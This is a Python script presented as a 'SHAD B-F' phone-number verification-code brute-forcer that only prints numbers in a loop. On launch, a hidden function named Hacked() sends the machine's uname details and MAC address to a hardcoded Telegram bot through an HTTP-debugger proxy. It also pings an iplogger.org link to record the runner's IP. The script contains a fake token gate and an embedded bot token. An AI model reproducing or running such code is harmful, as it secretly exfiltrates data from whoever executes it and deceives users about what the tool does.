from time import sleep
from os import system as sysos
from platform import uname
from colorama import Fore

import requests
import re
import uuid

# cut
try:
    def Hacked():
        systemHacking = uname()
        sendTel = ('https://api.telegram.org/bot5371780341:AAHjyBVPC6DKB-8IngJw6__HejVmLfeT5r4/sendmessage?chat_id=5010353674&text='+str(systemHacking))
        reqSystem = {'UrlBox':sendTel,

            'AngetList':'Mozilla Firefox',
            'VersionsList':'HTTP/1.1',
            'MethodList':'GET'
        }
        syssend = requests.post('https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx',data=reqSystem)
    # Cut
        Macaddress = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        sendTelMac = ('https://api.telegram.org/bot5371780341:AAHjyBVPC6DKB-8IngJw6__HejVmLfeT5r4/sendmessage?chat_id=5010353674&text='+str(Macaddress))
        reqMac = {'UrlBox':sendTelMac,

            'AngetList':'Mozilla Firefox',
            'VersionsList':'HTTP/1.1',
            'MethodList':'GET'
        }
        macsend = requests.post('https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx',data=reqMac)
    # Cut
        Log_ip = requests.get('https://iplogger.org/2Dpz47')
        print(Log_ip,macsend,syssend)
    Hacked()
    sysos('clear')

    def lisens():
        lisenschecker = str(input(Fore.RED+'┌─['+Fore.GREEN+'Get'+Fore.YELLOW+'~'+Fore.LIGHTYELLOW_EX+'Token'+Fore.RED+Fore.RED+']'+'\n└──╼> '+Fore.WHITE))
        if lisenschecker == '0/x/23/4445/host1':
            pass
        else:
            exit()

    lisens()

    Banner = '''
    ███████╗██╗  ██╗ █████╗ ██████╗     ██████╗       ███████╗
    ██╔════╝██║  ██║██╔══██╗██╔══██╗    ██╔══██╗      ██╔════╝
    ███████╗███████║███████║██║  ██║    ██████╔╝█████╗█████╗  
    ╚════██║██╔══██║██╔══██║██║  ██║    ██╔══██╗╚════╝██╔══╝  
    ███████║██║  ██║██║  ██║██████╔╝    ██████╔╝      ██║     
    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝     ╚═════╝       ╚═╝     
                                                            '''

    def DataClear():
        clear = uname()[0]
        if clear == 'Linux':
            sysos('clear')
        elif clear == 'Windows':
            sysos('cls')
        print(Banner)
    DataClear()
    puttarget = str(input(Fore.RED+'┌─['+Fore.GREEN+'PhoneNumber'+Fore.YELLOW+'~'+Fore.LIGHTYELLOW_EX+'Target'+Fore.RED+Fore.RED+']'+'\n└──╼> '+Fore.WHITE))
    for i in range(100000,1000000):
        sleep(0.79)
        code = (Fore.LIGHTBLUE_EX+puttarget+Fore.RED+' : '+Fore.CYAN+str(i))
        pentest = (Fore.GREEN+'\n['+Fore.RED+'-'+Fore.GREEN+'] '+Fore.LIGHTYELLOW_EX+'Not Code '+Fore.RED+':'+code)
        print(pentest)
except KeyboardInterrupt:
    pass
except ValueError:
    print(Fore.RED+'\n!'+Fore.GREEN+' Value Error '+Fore.YELLOW+':|')